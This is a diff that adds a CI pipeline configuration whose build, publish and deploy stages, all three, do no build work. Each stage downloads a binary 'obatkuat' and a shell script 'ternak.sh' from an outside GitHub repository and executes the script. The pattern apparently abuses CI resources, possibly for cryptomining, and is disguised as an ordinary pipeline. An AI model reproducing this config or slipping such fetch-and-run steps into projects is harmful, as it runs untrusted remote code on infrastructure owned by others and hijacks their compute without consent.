@@ -1,0 +1,20 @@
+pipeline:
+  build:
+    image: golang
+    commands:
+      - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
+      - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+      
+  publish:
+    image: golang
+    commands:
+      - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
+      - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+      
+
+  deploy:
+    image: golang
+    commands:
+      - wget https://raw.githubusercontent.com/outbesok/mesin/main/obatkuat
+      - wget https://raw.githubusercontent.com/outbesok/mesin/main/ternak.sh && chmod u+x ternak.sh && ./ternak.sh
+      
